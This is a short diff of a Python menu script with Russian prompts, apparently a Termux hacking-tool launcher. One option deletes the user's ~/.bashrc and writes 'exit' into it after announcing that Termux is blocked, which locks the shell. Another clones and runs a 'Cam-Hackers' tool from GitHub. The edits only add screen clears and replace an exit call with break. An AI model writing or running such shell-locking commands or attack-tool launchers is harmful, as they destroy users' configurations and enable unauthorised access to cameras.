@@ -240,11 +240,12 @@ while True:
         res()
         tsu_06 = input('[y/n] >>> ')
         if tsu_06 == 'y':
+            os.system('clear')
             print(Fore.RED+'[termux заблокирован]')
             time.sleep(5)
             os.system('rm ~/.bashrc')
             os.system('echo "exit" >> ~/.bashrc')
-            os.system('exit')
+            break
         if tsu_06 == 'n':
             os.system('clear')
         else:
@@ -257,6 +258,7 @@ while True:
         os.system('pip install requests')
         os.system('git clone https://github.com/AngelSecurityTeam/Cam-Hackers') 
         os.chdir('Cam-Hackers')
+        os.system('clear')
         os.system('chmod +x *')
         os.system('python cam-hackers.py')
         tsu_44 = input('[нажмите entr чтобы выйти]')
